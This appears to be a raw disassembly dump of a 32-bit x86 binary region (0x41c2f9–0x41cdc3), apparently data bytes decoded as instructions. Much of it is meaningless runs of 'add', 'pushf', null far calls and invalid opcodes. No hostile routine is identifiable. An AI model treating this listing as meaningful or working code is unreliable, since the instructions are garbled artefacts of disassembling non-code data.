  41c2f9:	cmp    edi,DWORD PTR [ecx+0x44]
  41c2fc:	ss aaa 
  41c2fe:	pop    eax
  41c2ff:	jae    0x41c373
  41c301:	dec    edi
  41c302:	ds call 0x0:0x404035c
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	adc    BYTE PTR [ebp+0x79],bl
  41c30f:	jns    0x41c295
  41c311:	xor    BYTE PTR [ebp+eiz*2+0x4b],bl
  41c315:	aaa    
  41c316:	pop    eax
  41c317:	pop    edi
  41c318:	bound  si,DWORD PTR [edx+0x6e]
  41c31c:	jle    0x41c29f
  41c31e:	jl     0x41c2a0
  41c320:	jg     0x41c3a0
  41c322:	popa   
  41c323:	pop    edi
  41c324:	ins    BYTE PTR es:[edi],dx
  41c325:	call   0x0:0x0
  41c32c:	add    BYTE PTR [eax],al
  41c32e:	imul   ebx,DWORD PTR [edx+0x6c372323],0x68
  41c335:	inc    ebp
  41c336:	dec    eax
  41c337:	pop    ecx
  41c338:	pop    ecx
  41c339:	pop    esi
  41c33a:	outs   dx,BYTE PTR ds:[esi]
  41c33b:	dec    ecx
  41c33c:	bound  esi,QWORD PTR [esi]
  41c33e:	pop    eax
  41c33f:	jle    0x41c3b4
  41c341:	test   BYTE PTR [ebx],al
  41c343:	test   DWORD PTR [edi+eax*1],edx
  41c346:	add    BYTE PTR [eax],al
  41c348:	add    BYTE PTR [eax],al
  41c34a:	add    BYTE PTR [eax],al
  41c34c:	or     BYTE PTR [edx],al
  41c34e:	xchg   edi,eax
  41c34f:	sbb    BYTE PTR gs:[edx+0x46],ah
  41c353:	inc    esi
  41c354:	gs dec ebx
  41c356:	inc    esi
  41c357:	pop    edi
  41c358:	outs   dx,DWORD PTR ds:[esi]
  41c359:	arpl   WORD PTR [ecx+0x65],cx
  41c35c:	outs   dx,DWORD PTR ds:[esi]
  41c35d:	push   0x6e
  41c35f:	popa   
  41c360:	outs   dx,BYTE PTR ds:[esi]
  41c361:	outs   dx,DWORD PTR ds:[esi]
  41c362:	pusha  
  41c363:	pop    eax
  41c364:	xchg   DWORD PTR [ecx+0x2],ecx
  41c36a:	add    BYTE PTR [eax],al
  41c36c:	add    BYTE PTR [edx],al
  41c36e:	xchg   BYTE PTR [eax+0x6769352a],cl
  41c374:	pop    edi
  41c375:	dec    eax
  41c376:	dec    eax
  41c377:	inc    esi
  41c378:	dec    ecx
  41c379:	pop    eax
  41c37a:	pop    ecx
  41c37b:	xor    eax,0x7c626362
  41c380:	jae    0x41c31e
  41c382:	mov    DWORD PTR [edi+0x8],edx
	...
  41c38d:	add    al,BYTE PTR [eax]
  41c38f:	jl     0x41c3c8
  41c391:	xchg   DWORD PTR [edi],esi
  41c393:	cmp    DWORD PTR [ebx+0x36],edi
  41c396:	inc    esi
  41c397:	pusha  
  41c398:	pop    edi
  41c399:	fs aaa 
  41c39b:	pop    ecx
  41c39c:	pop    esi
  41c39d:	jle    0x41c3fe
  41c39f:	inc    esi
  41c3a0:	outs   dx,DWORD PTR ds:[esi]
  41c3a1:	gs pop ecx
  41c3a3:	jno    0x41c32d
  41c3a5:	call   0x0:0x0
  41c3ac:	add    al,BYTE PTR [eax]
  41c3ae:	pushf  
  41c3af:	pusha  
  41c3b0:	inc    edx
  41c3b1:	pop    esp
  41c3b2:	test   BYTE PTR [esi],bh
  41c3b4:	gs inc esi
  41c3b6:	inc    edi
  41c3b7:	dec    eax
  41c3b8:	pop    ecx
  41c3b9:	bound  ecx,QWORD PTR [eax+0x36]
  41c3bc:	dec    ebx
  41c3bd:	inc    esi
  41c3be:	pop    eax
  41c3bf:	xchg   DWORD PTR [ebp+ebx*4+0x7a],edi
  41c3c3:	add    al,BYTE PTR [eax+eax*1]
  41c3c6:	add    BYTE PTR [eax],al
  41c3c8:	add    BYTE PTR [eax],al
  41c3ca:	add    BYTE PTR [eax],al
  41c3cc:	add    BYTE PTR [ecx],cl
  41c3ce:	add    BYTE PTR [eax],al
  41c3d0:	jl     0x41c418
  41c3d2:	pop    eax
  41c3d3:	and    eax,0x65464647
  41c3d8:	dec    edi
  41c3d9:	jae    0x41c426
  41c3db:	inc    ebp
  41c3dc:	jno    0x41c44a
  41c3de:	push   ebp
  41c3df:	aaa    
  41c3e0:	pusha  
  41c3e1:	gs inc ebp
  41c3e3:	pop    eax
  41c3e4:	pusha  
  41c3e5:	cwde   
  41c3e6:	add    BYTE PTR [eax],al
  41c3e8:	add    BYTE PTR [eax],al
  41c3ea:	add    BYTE PTR [edx+eax*1],al
  41c3ed:	jns    0x41c378
  41c3ef:	push   esi
  41c3f0:	push   esi
  41c3f1:	push   0x68
  41c3f3:	bound  eax,QWORD PTR gs:[esi+0x45]
  41c3f7:	push   ebp
  41c3f8:	pop    eax
  41c3f9:	bound  ebp,QWORD PTR ds:0x74646446
  41c3ff:	xchg   edi,eax
  41c400:	lahf   
  41c401:	mov    DWORD PTR [eax],eax
	...
  41c40b:	add    BYTE PTR [eax],al
  41c40d:	add    BYTE PTR [eax+eax*1],al
  41c410:	add    bl,BYTE PTR [eax+0x4b46785c]
  41c416:	arpl   WORD PTR fs:[edx+0x6c],dx
  41c41a:	and    al,0x46
  41c41c:	je     0x41c488
  41c41e:	inc    edi
  41c41f:	dec    ebx
  41c420:	pop    ecx
  41c421:	jb     0x41c485
  41c423:	dec    ecx
  41c424:	pusha  
  41c425:	cwde   
  41c426:	add    al,BYTE PTR [eax]
  41c428:	add    BYTE PTR [eax],al
  41c42a:	add    BYTE PTR [eax],al
  41c42c:	add    BYTE PTR [eax+0x5e556a6e],bl
  41c432:	mov    WORD PTR [ebx+0x46],?
  41c435:	pop    ecx
  41c436:	pop    ecx
  41c437:	jnp    0x41c47f
  41c439:	data16 data16 arpl WORD PTR [esi-0x6f],si
  41c43e:	mov    al,ds:0x200439f
	...
  41c44f:	add    al,0x4
  41c451:	add    bl,BYTE PTR [esp+ebx*4+0x66496e9a]
  41c458:	xor    eax,0x59594b97
  41c45d:	push   0x62
  41c45f:	bound  di,DWORD PTR [ebx+0x7e]
  41c463:	bound  esi,QWORD PTR [edx-0x68]
  41c466:	add    BYTE PTR [eax],al
  41c468:	add    BYTE PTR [edx+eax*1],al
  41c46b:	add    BYTE PTR [edi+0x6605e8a],bl
  41c471:	pop    esp
  41c472:	mov    WORD PTR [ecx+0x65826456],ds
  41c478:	cs data16 ja 0x41c4f7
  41c47c:	mov    ah,BYTE PTR [eax+0x2b97]
	...
  41c48e:	add    BYTE PTR [eax],al
  41c490:	add    BYTE PTR [eax+eax*1],al
  41c493:	add    al,0x89
  41c495:	mov    DWORD PTR [esp+ebx*4+0x65599724],ebx
  41c49c:	jnp    0x41c422
  41c49e:	arpl   WORD PTR [edi-0x7e],bp
  41c4a1:	jle    0x41c429
  41c4a3:	data16 mov bl,BYTE PTR [edi+0x2]
  41c4aa:	add    al,0x98
  41c4ac:	mov    DWORD PTR [eax+0x5e],ebx
  41c4af:	adc    esi,DWORD PTR [eax]
  41c4b1:	sahf   
  41c4b2:	xchg   edi,eax
  41c4b3:	js     0x41c4d7
  41c4b5:	and    BYTE PTR ss:[eax+0x68],0x9c
  41c4ba:	pushf  
  41c4bb:	pushf  
  41c4bc:	pushf  
  41c4bd:	add    BYTE PTR [eax],al
  41c4bf:	add    al,BYTE PTR [eax]
	...
  41c4d1:	add    BYTE PTR [ecx],cl
  41c4d3:	add    al,0x2
  41c4d5:	add    al,0x7a
  41c4d7:	call   0x5c9c:0x819c9822
  41c4de:	pusha  
  41c4df:	outs   dx,DWORD PTR ds:[esi]
  41c4e0:	sbb    BYTE PTR [esi+eax*4+0x9f9f87],0x0
  41c4e8:	add    al,0x38
  41c4ea:	sahf   
  41c4eb:	lahf   
  41c4ec:	cwde   
  41c4ed:	xchg   BYTE PTR [esi-0x68616166],al
  41c4f3:	jns    0x41c48f
  41c4f5:	xchg   edi,eax
  41c4f6:	popf   
  41c4f7:	pushf  
  41c4f8:	pushf  
  41c4f9:	pushf  
  41c4fa:	jp     0x41c4fc
  41c4fc:	add    al,BYTE PTR [eax]
	...
  41c516:	add    BYTE PTR [edx],al
  41c518:	add    BYTE PTR [edi+ebx*4-0x63636364],bl
  41c51f:	pushf  
  41c520:	pushf  
  41c521:	pushf  
  41c522:	pushf  
  41c523:	pushf  
  41c524:	pushf  
  41c525:	add    dl,BYTE PTR ds:0x9c380300
  41c52b:	lahf   
  41c52c:	pushf  
  41c52d:	pushf  
  41c52e:	pushf  
  41c52f:	pushf  
  41c530:	pushf  
  41c531:	pushf  
  41c532:	pushf  
  41c533:	pushf  
  41c534:	pushf  
  41c535:	pushf  
  41c536:	add    al,BYTE PTR [edx]
  41c538:	add    al,0xa
  41c53a:	add    al,0x2
  41c53c:	push   es
	...
  41c565:	adc    al,BYTE PTR [eax+eax*1]
	...
  41c648:	adc    DWORD PTR [eax],eax
	...
  41c686:	add    BYTE PTR [eax],al
  41c688:	dec    ebx
  41c689:	adc    DWORD PTR [eax],eax
	...
  41c6c7:	push   es
  41c6c8:	add    BYTE PTR [eax],al
  41c6ca:	push   es
	...
  41c707:	dec    ebx
  41c708:	add    BYTE PTR [eax],al
  41c70a:	add    BYTE PTR [ecx],dl
	...
  41c744:	add    BYTE PTR [ecx],dl
  41c746:	add    BYTE PTR [eax],al
  41c748:	add    al,al
  41c74a:	add    BYTE PTR [eax],al
  41c74c:	add    BYTE PTR [eax],al
  41c74e:	add    BYTE PTR [eax],al
  41c750:	pop    es
  41c751:	add    BYTE PTR [eax],0x0
  41c754:	add    BYTE PTR [eax],al
  41c756:	add    BYTE PTR [eax],al
  41c758:	add    eax,DWORD PTR [eax]
  41c75a:	add    BYTE PTR [eax],al
  41c75c:	add    BYTE PTR [eax],al
  41c75e:	add    BYTE PTR [eax],al
  41c760:	add    DWORD PTR [eax],eax
	...
  41c936:	add    BYTE PTR [eax],al
  41c938:	add    DWORD PTR [eax+0x0],eax
  41c93e:	add    BYTE PTR [eax],al
  41c940:	add    eax,eax
  41c942:	add    BYTE PTR [eax],al
  41c944:	add    BYTE PTR [eax],al
  41c946:	add    BYTE PTR [eax],al
  41c948:	pop    es
  41c949:	sub    BYTE PTR [eax],al
  41c94b:	add    BYTE PTR [eax],al
  41c94d:	xor    BYTE PTR [eax],al
  41c94f:	add    BYTE PTR [eax],al
  41c951:	pusha  
  41c952:	add    BYTE PTR [eax],al
  41c954:	add    BYTE PTR [ecx],al
  41c956:	add    BYTE PTR [eax],cl
  41c958:	add    BYTE PTR [eax],al
  41c95a:	add    BYTE PTR [eax],al
  41c95c:	add    BYTE PTR [eax+0xa],al
	...
  41c96a:	add    DWORD PTR [eax],eax
	...
  41c974:	add    BYTE PTR [eax],al
  41c976:	add    BYTE PTR ds:0x4040500,al
  41c97c:	add    BYTE PTR [ecx],al
  41c97e:	or     BYTE PTR [esi],al
  41c980:	add    BYTE PTR [eax],al
  41c982:	add    BYTE PTR [edx],cl
  41c984:	add    BYTE PTR [eax],al
  41c986:	add    BYTE PTR ds:0xc030400,cl
  41c98c:	add    BYTE PTR [esp+eax*1],al
  41c98f:	or     eax,0xf070800
  41c994:	add    BYTE PTR [edx],cl
  41c996:	or     DWORD PTR [esi],ecx
  41c998:	add    BYTE PTR [eax],al
  41c99a:	add    BYTE PTR [ecx],dl
  41c99c:	add    BYTE PTR [edx],al
  41c99e:	add    eax,0x6060010
  41c9a3:	adc    eax,DWORD PTR [eax]
  41c9a5:	add    BYTE PTR [eax],al
  41c9a7:	push   ss
  41c9a8:	add    BYTE PTR [edx],al
  41c9aa:	add    eax,0x7090015
  41c9af:	adc    DWORD PTR [eax],eax
  41c9b1:	or     ecx,DWORD PTR [edx]
  41c9b3:	adc    al,0x0
  41c9b5:	add    BYTE PTR [eax],al
  41c9b7:	sbb    DWORD PTR [eax],eax
  41c9b9:	add    al,0x0
  41c9bb:	sbb    DWORD PTR [eax],eax
  41c9bd:	add    BYTE PTR [eax],al
  41c9bf:	push   ds
  41c9c0:	add    BYTE PTR [ecx],al
  41c9c2:	add    al,0x1c
  41c9c4:	add    BYTE PTR [edx],cl
  41c9c6:	or     DWORD PTR [edi],ebx
  41c9c8:	add    BYTE PTR [eax],dl
  41c9ca:	or     al,0x1c
  41c9cc:	add    BYTE PTR [ecx],cl
  41c9ce:	adc    BYTE PTR [esi],bl
  41c9d0:	add    BYTE PTR [esi],dl
  41c9d2:	adc    ebx,DWORD PTR [eax+eax*1]
  41c9d5:	add    BYTE PTR [eax],al
  41c9d7:	and    DWORD PTR [eax],eax
  41c9d9:	add    BYTE PTR [esi],al
  41c9db:	and    al,BYTE PTR [eax]
  41c9dd:	push   es
  41c9de:	push   es
  41c9df:	and    eax,DWORD PTR [eax]
  41c9e1:	add    BYTE PTR [eax],al
  41c9e3:	add    BYTE PTR es:[eax*1+0x9090026],al
  41c9eb:	daa    
  41c9ec:	add    BYTE PTR [eax],al
  41c9ee:	add    BYTE PTR [ecx],ch
  41c9f0:	add    BYTE PTR [ecx],al
  41c9f2:	add    al,0x29
  41c9f4:	add    BYTE PTR ds:0x2a06,al
  41c9fa:	add    BYTE PTR ds:0x2e060200,ch
  41ca00:	add    BYTE PTR [ebx],cl
  41ca02:	or     ch,BYTE PTR ds:0x260f1100
  41ca08:	add    BYTE PTR [ecx],dl
  41ca0a:	cvtps2pi mm0,QWORD PTR [eax]
  41ca0d:	or     eax,0x1b002a11
  41ca12:	adc    eax,0x13140025
  41ca17:	sub    al,0x0
  41ca19:	add    BYTE PTR [eax],al
  41ca1b:	xor    DWORD PTR [eax],eax
  41ca1d:	add    eax,DWORD PTR ds:0x32
  41ca23:	xor    eax,0x360e0700
  41ca28:	add    BYTE PTR [esp+ecx*1],cl
  41ca2b:	xor    al,0x0
  41ca2d:	add    BYTE PTR [eax],al
  41ca2f:	cmp    DWORD PTR [eax],eax
  41ca31:	add    BYTE PTR [eax],al
  41ca33:	cmp    eax,0x3c060300
  41ca38:	add    BYTE PTR [esi],al
  41ca3a:	push   es
  41ca3b:	cmp    eax,0x3d0f0500
  41ca40:	add    BYTE PTR [esi],cl
  41ca42:	adc    dh,BYTE PTR ds:0x33180f00
  41ca48:	add    BYTE PTR [ebx],cl
  41ca4a:	adc    BYTE PTR [eax],bh
  41ca4c:	add    BYTE PTR [ebx],cl
  41ca4e:	adc    DWORD PTR [esi],edi
  41ca50:	add    BYTE PTR [esi],dl
  41ca52:	adc    eax,0x13190036
  41ca57:	xor    al,BYTE PTR [eax]
  41ca59:	sbb    al,0x19
  41ca5b:	add    BYTE PTR ss:[eax+edx*1],dl
  41ca5f:	cmp    DWORD PTR [eax],eax
  41ca61:	adc    dl,BYTE PTR ds:0x1a22003e
  41ca67:	sub    eax,DWORD PTR [eax]
  41ca69:	and    ebx,DWORD PTR [edi]
  41ca6b:	cmp    eax,DWORD PTR [eax]
  41ca6d:	and    bl,BYTE PTR [ecx]
  41ca6f:	cmp    al,0x0
  41ca71:	das    
  41ca72:	and    al,0x39
  41ca74:	add    BYTE PTR [eax],al
  41ca76:	add    BYTE PTR [ecx+0x0],al
  41ca79:	add    BYTE PTR [eax],al
  41ca7b:	inc    ebp
  41ca7c:	add    BYTE PTR [ecx],al
  41ca7e:	add    eax,0x70a0045
  41ca83:	inc    eax
  41ca84:	add    BYTE PTR [edx+ecx*1],al
  41ca87:	inc    esp
  41ca88:	add    BYTE PTR [eax],cl
  41ca8a:	or     BYTE PTR [ebx+0x0],al
  41ca8d:	(bad)  
  41ca8e:	cmovbe eax,DWORD PTR [eax]
  41ca91:	add    BYTE PTR [eax],al
  41ca93:	dec    ecx
  41ca94:	add    BYTE PTR [eax],al
  41ca96:	add    BYTE PTR [esi+0x0],cl
  41ca99:	add    al,0x7
  41ca9b:	dec    edi
  41ca9c:	add    BYTE PTR [ecx],al
  41ca9e:	push   cs
  41ca9f:	dec    edi
  41caa0:	add    BYTE PTR [ebx+ecx*1],cl
  41caa3:	dec    edx
  41caa4:	add    BYTE PTR [edx+edx*1],bl
  41caa7:	inc    eax
  41caa8:	add    BYTE PTR [ebx],bl
  41caaa:	sbb    eax,DWORD PTR [edi+0x0]
  41caad:	adc    edx,DWORD PTR [edx]
  41caaf:	dec    ecx
  41cab0:	add    BYTE PTR [eax],al
  41cab2:	add    BYTE PTR [eax+eax*1+0x3],dl
  41cab6:	pop    es
  41cab7:	pop    ecx
  41cab8:	add    BYTE PTR [esi],al
  41caba:	or     ebx,DWORD PTR [edi+0x0]
  41cabd:	adc    cl,BYTE PTR ds:0x110c0055
  41cac3:	push   ebp
  41cac4:	add    BYTE PTR ds:0x22005419,dl
  41caca:	sbb    eax,0x22150057
  41cacf:	push   esi
  41cad0:	add    BYTE PTR [esi],ch
  41cad2:	cs inc edi
  41cad4:	add    BYTE PTR [eax],ch
  41cad6:	and    ecx,DWORD PTR [eax+0x0]
  41cad9:	xor    al,0x23
  41cadb:	inc    esi
  41cadc:	add    BYTE PTR [ebx],ah
  41cade:	and    eax,0x34390056
  41cae3:	push   ecx
  41cae4:	add    BYTE PTR [ecx],al
  41cae6:	add    eax,0x140c0068
  41caeb:	push   0x0
  41caed:	push   ss
  41caee:	sbb    DWORD PTR [ebp+0x0],esp
  41caf1:	add    eax,0xe00770c
  41caf6:	sbb    BYTE PTR [ecx+0x0],bh
  41caf9:	adc    eax,0x1e00751d
  41cafe:	sbb    dh,BYTE PTR [ecx+0x0]
  41cb01:	sbb    ah,BYTE PTR [ebx]
  41cb03:	arpl   WORD PTR [eax],ax
  41cb05:	sbb    ebp,DWORD PTR ds:0x230e0066
  41cb0b:	js     0x41cb0d
  41cb0d:	sbb    DWORD PTR [ecx],ebp
  41cb0f:	jne    0x41cb11
  41cb11:	sub    ebp,DWORD PTR [edi]
  41cb13:	ins    DWORD PTR es:[edi],dx
  41cb14:	add    BYTE PTR ds:0x21007f32,ah
  41cb1a:	cmp    bh,BYTE PTR [edi+0x0]
  41cb1d:	sub    eax,DWORD PTR [esi+0x55]
  41cb20:	add    BYTE PTR ds:0x200735b,bl
  41cb26:	or     eax,DWORD PTR [esi-0x79f1eb00]
  41cb2c:	add    BYTE PTR [esi],al
  41cb2e:	push   ss
  41cb2f:	xchg   BYTE PTR [eax],al
  41cb31:	pop    es
  41cb32:	seto   BYTE PTR [eax]
  41cb35:	or     ebx,DWORD PTR [edx]
  41cb37:	xchg   esi,eax
  41cb38:	add    BYTE PTR [esi],dl
  41cb3a:	adc    eax,0x230d0095
  41cb3f:	add    DWORD PTR [eax],0x18
  41cb42:	and    BYTE PTR [ecx-0x79d5e100],al
  41cb48:	add    BYTE PTR [ecx],dl
  41cb4a:	and    al,0x97
  41cb4c:	add    BYTE PTR [edx],bl
  41cb4e:	sub    al,0x95
  41cb50:	add    BYTE PTR [edi],bl
  41cb52:	aaa    
  41cb53:	fwait
  41cb54:	add    BYTE PTR ds:0x4008e2d,ch
  41cb5a:	push   cs
  41cb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb5c:	add    BYTE PTR [ebx],cl
  41cb5e:	sbb    ebp,DWORD PTR [ecx-0x48f3fc00]
  41cb64:	add    BYTE PTR [edi],al
  41cb66:	adc    DWORD PTR [ecx-0x43efed00],edi
  41cb6c:	add    BYTE PTR [ebx],cl
  41cb6e:	sub    BYTE PTR [ebx-0x5fd2ec00],ch
  41cb74:	add    BYTE PTR [ebx],dl
  41cb76:	xor    al,0xa9
  41cb78:	add    BYTE PTR [edi],bl
  41cb7a:	aas    
  41cb7b:	lods   al,BYTE PTR ds:[esi]
  41cb7c:	add    BYTE PTR [esp],cl
  41cb7f:	mov    bl,0x0
  41cb81:	push   ds
  41cb82:	sub    al,0xba
  41cb84:	add    BYTE PTR [esi],cl
  41cb86:	xor    eax,0x2a2400ba
  41cb8b:	test   eax,0x8f421800
  41cb90:	add    BYTE PTR [ecx],dh
  41cb92:	dec    ebx
  41cb93:	xchg   ebx,eax
  41cb94:	add    BYTE PTR ds:0x19009660,ch
  41cb9a:	push   ecx
  41cb9b:	scas   eax,DWORD PTR es:[edi]
  41cb9c:	add    BYTE PTR [ecx],ch
  41cb9e:	dec    esp
  41cb9f:	scas   eax,DWORD PTR es:[edi]
  41cba0:	add    BYTE PTR [edx],ah
  41cba2:	pop    esi
  41cba3:	mov    al,0x0
  41cba5:	sub    ebp,DWORD PTR [ebp-0x4f]
  41cba8:	add    BYTE PTR [edi+0x7b],cl
  41cbab:	xchg   ebp,eax
  41cbac:	add    BYTE PTR [eax],cl
  41cbae:	adc    esp,eax
  41cbb0:	add    BYTE PTR [edx],cl
  41cbb2:	push   ss
  41cbb3:	xlat   BYTE PTR ds:[ebx]
  41cbb4:	add    BYTE PTR [esi],cl
  41cbb6:	and    cl,dl
  41cbb8:	add    BYTE PTR [edi],bl
  41cbba:	sub    cl,dh
  41cbbc:	add    BYTE PTR [ecx],dl
  41cbbe:	rol    DWORD PTR ss:[eax],cl
  41cbc1:	pop    es
  41cbc2:	psubsw mm0,QWORD PTR [eax]
  41cbc5:	or     edx,DWORD PTR [ebx]
  41cbc7:	out    dx,eax
  41cbc8:	add    BYTE PTR [esi],al
  41cbca:	push   cs
  41cbcb:	inc    DWORD PTR [eax]
  41cbcd:	or     DWORD PTR ds:0x100700f4,edx
  41cbd3:	inc    DWORD PTR [eax]
  41cbd5:	or     BYTE PTR [edx],dl
  41cbd7:	inc    DWORD PTR [eax]
  41cbd9:	or     dl,BYTE PTR [esi]
  41cbdb:	inc    DWORD PTR [eax]
  41cbdd:	or     ebx,DWORD PTR [ecx]
  41cbdf:	inc    DWORD PTR [eax]
  41cbe1:	or     al,0x1b
  41cbe3:	inc    DWORD PTR [eax]
  41cbe5:	or     al,0x1e
  41cbe7:	inc    DWORD PTR [eax]
  41cbe9:	or     eax,0xb00ff22
  41cbee:	sub    ebp,edi
  41cbf0:	add    BYTE PTR ds:0x1f00ff36,cl
  41cbf6:	inc    ebx
  41cbf7:	les    eax,FWORD PTR [eax]
  41cbf9:	sub    ebx,DWORD PTR [edi-0x3c]
  41cbfc:	add    BYTE PTR [ebx+edx*2],ah
  41cbff:	int3   
  41cc00:	add    BYTE PTR [esi],bl
  41cc02:	jl     0x41cbd8
  41cc04:	add    BYTE PTR ds:0x6100bd86,ch
  41cc0a:	call   0xbe:0xa94600ae
  41cc11:	and    DWORD PTR [edi-0x7bc1ff39],eax
  41cc17:	retf   0x2800
  41cc1a:	cwde   
  41cc1b:	ret    
  41cc1c:	add    BYTE PTR ds:0x2600c397,bh
  41cc22:	call   0xc8:0xb11a00d0
  41cc29:	sub    BYTE PTR [ebx-0x5ac1ff35],ch
  41cc2f:	enter  0x3500,0xb7
  41cc33:	into   
  41cc34:	add    BYTE PTR [ecx],ah
  41cc36:	stos   DWORD PTR es:[edi],eax
  41cc37:	(bad)  
  41cc38:	add    BYTE PTR ds:0x3e00d2a1,dh
  41cc3e:	scas   al,BYTE PTR es:[edi]
  41cc3f:	rol    DWORD PTR [eax],cl
  41cc41:	sub    al,0xb5
  41cc43:	(bad)  
  41cc44:	add    BYTE PTR ds:0x1a00d4be,dh
  41cc4a:	pushf  
  41cc4b:	cmc    
  41cc4c:	add    BYTE PTR [eax+ecx*4],ah
  41cc4f:	in     al,dx
  41cc50:	add    BYTE PTR [ecx],dh
  41cc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc53:	in     al,dx
  41cc54:	add    BYTE PTR [edx-0x72],dl
  41cc57:	mov    DWORD PTR [eax],0xc8aa5f
  41cc5d:	dec    ebp
  41cc5e:	mov    dl,0xd8
  41cc60:	add    BYTE PTR [ecx-0x42],bl
  41cc63:	fild   DWORD PTR [eax]
  41cc65:	imul   esi,DWORD PTR [edi-0x44bbff28],0xb75800e2
  41cc6f:	jmp    0x41cc71
  41cc71:	sub    al,bh
  41cc73:	jmp    0xcf062678
  41cc78:	add    BYTE PTR [ecx-0x3e],cl
  41cc7b:	aam    0x0
  41cc7d:	inc    esp
  41cc7e:	retf   0xde
  41cc81:	pusha  
  41cc82:	(bad)  
  41cc83:	fild   DWORD PTR [eax]
  41cc85:	ja     0x41cc51
  41cc87:	fadd   QWORD PTR [eax]
  41cc89:	pop    ebx
  41cc8a:	ret    
  41cc8b:	out    dx,al
  41cc8c:	add    BYTE PTR [esi-0x2a],bl
  41cc8f:	out    dx,eax
  41cc90:	add    BYTE PTR [esi-0x2c],ch
  41cc93:	jmp    0xda0a5c98
  41cc98:	add    BYTE PTR [eax-0x79ff2d3d],ch
  41cc9e:	fsubr  st,st(4)
  41cca0:	add    BYTE PTR [esi+ebx*8-0x144dff15],bl
  41cca7:	out    0x0,eax
  41cca9:	mov    dl,0xf3
  41ccab:	in     al,dx
  41ccac:	add    BYTE PTR [eax-0x4bff0b12],ch
  41ccb2:	out    dx,eax
  41ccb3:	clc    
  41ccb4:	add    BYTE PTR [ecx-0x4bff0a01],ch
  41ccba:	push   ebp
  41ccbc:	add    BYTE PTR [ecx-0x41ff0801],bh
  41ccc2:	push   edi
  41ccc4:	add    cl,cl
  41ccc6:	push   edi
  41ccc8:	add    ah,al
  41ccca:	add    bh,cl
  41cccc:	add    cl,ah
  41ccce:	add    al,dh
  41ccd0:	add    al,dh
  41ccd2:	adc    edi,edi
  41ccd4:	add    dl,dh
  41ccd6:	xor    edi,edi
  41ccd8:	add    ah,dh
  41ccda:	push   ecx
  41ccdb:	inc    DWORD PTR [eax]
  41ccdd:	div    BYTE PTR [ecx-0x1]
  41cce0:	add    bh,dh
  41cce2:	xchg   ecx,eax
  41cce3:	inc    DWORD PTR [eax]
  41cce5:	stc    
  41cce6:	mov    cl,0xff
  41cce8:	add    bl,bh
  41ccea:	sar    edi,1
  41ccec:	add    bh,bh
  41ccee:	(bad)  
  41ccef:	inc    DWORD PTR [eax]
  41ccf1:	add    BYTE PTR [eax],al
  41ccf3:	add    BYTE PTR [eax],al
  41ccf5:	sbb    eax,DWORD PTR [eax]
  41ccf7:	das    
  41ccf8:	add    BYTE PTR ds:0x3f005000,ch
  41ccfe:	add    BYTE PTR [eax+0x0],dh
  41cd01:	push   edx
  41cd02:	add    BYTE PTR [eax-0x4fff9d00],dl
  41cd08:	add    BYTE PTR [esi+0x0],dh
  41cd0b:	iret   
  41cd0c:	add    BYTE PTR [eax-0x66ff1000],cl
  41cd12:	adc    edi,edi
  41cd14:	add    BYTE PTR [esi-0x4bff00cf],ah
  41cd1a:	push   ecx
  41cd1b:	inc    DWORD PTR [eax]
  41cd1d:	ret    0xff71
  41cd20:	add    bh,cl
  41cd22:	xchg   ecx,eax
  41cd23:	inc    DWORD PTR [eax]
  41cd25:	fdiv   QWORD PTR [ecx-0x2e14ff01]
  41cd2b:	inc    DWORD PTR [eax]
  41cd2d:	(bad)  
  41cd2e:	(bad)  
  41cd2f:	inc    DWORD PTR [eax]
  41cd31:	add    BYTE PTR [eax],al
  41cd33:	add    BYTE PTR [eax],al
  41cd35:	or     BYTE PTR [eax],al
  41cd37:	das    
  41cd38:	add    BYTE PTR [esi],cl
  41cd3a:	add    BYTE PTR [eax+0x0],dl
  41cd3d:	adc    eax,0x1b007000
  41cd42:	add    BYTE PTR [eax-0x4fffdf00],dl
  41cd48:	add    BYTE PTR [esi],ah
  41cd4a:	add    bh,cl
  41cd4c:	add    BYTE PTR [eax+eax*1],ch
  41cd4f:	lock add BYTE PTR [esi],bh
  41cd52:	adc    edi,edi
  41cd54:	add    BYTE PTR [eax+0x31],bl
  41cd57:	inc    DWORD PTR [eax]
  41cd59:	jno    0x41cdac
  41cd5b:	inc    DWORD PTR [eax]
  41cd5d:	mov    WORD PTR [ecx-0x1],?
  41cd60:	add    BYTE PTR [esi-0x40ff006f],ah
  41cd66:	mov    cl,0xff
  41cd68:	add    dl,bl
  41cd6a:	sar    edi,1
  41cd6c:	add    bh,bh
  41cd6e:	(bad)  
  41cd6f:	inc    DWORD PTR [eax]
  41cd71:	add    BYTE PTR [ecx+ebx*1],bl
  41cd74:	sbb    al,0x19
  41cd76:	sbb    al,0x22
  41cd78:	and    ah,BYTE PTR [edx]
  41cd7a:	sub    ch,BYTE PTR [esp+ebp*1]
  41cd7d:	and    ch,BYTE PTR [edi]
  41cd7f:	sub    al,0x2c
  41cd81:	das    
  41cd82:	das    
  41cd83:	das    
  41cd84:	xor    BYTE PTR [eax],dh
  41cd86:	xor    BYTE PTR [edx+0x30],al
  41cd89:	inc    ecx
  41cd8a:	inc    ecx
  41cd8b:	inc    edx
  41cd8c:	dec    ecx
  41cd8d:	inc    ecx
  41cd8e:	das    
  41cd8f:	xor    BYTE PTR [eax],dh
  41cd91:	inc    ecx
  41cd92:	inc    ecx
  41cd93:	das    
  41cd94:	das    
  41cd95:	sub    al,0x2a
  41cd97:	sub    ch,BYTE PTR [edi+ebp*1]
  41cd9a:	das    
  41cd9b:	xor    BYTE PTR [edi],ch
  41cd9d:	xor    bl,BYTE PTR [eax+eax*1]
  41cda0:	add    BYTE PTR [edx],cl
  41cda2:	sbb    al,0x1f
  41cda4:	sbb    al,0x1f
  41cda6:	pop    ds
  41cda7:	sub    ch,BYTE PTR [edi+ebp*1]
  41cdaa:	xor    BYTE PTR [eax],dh
  41cdac:	das    
  41cdad:	das    
  41cdae:	xor    BYTE PTR [ecx+0x30],al
  41cdb1:	inc    edx
  41cdb2:	dec    eax
  41cdb3:	xor    BYTE PTR [eax],dh
  41cdb5:	inc    ecx
  41cdb6:	inc    ecx
  41cdb7:	inc    ecx
  41cdb8:	inc    ecx
  41cdb9:	inc    edx
  41cdba:	inc    ecx
  41cdbb:	xor    BYTE PTR [ecx+0x50],cl
  41cdbe:	dec    ecx
  41cdbf:	inc    edx
  41cdc0:	xor    BYTE PTR [eax],dh
  41cdc2:	inc    edx
  41cdc3:	xor    BYTE PTR [edi+ebp*1],ch
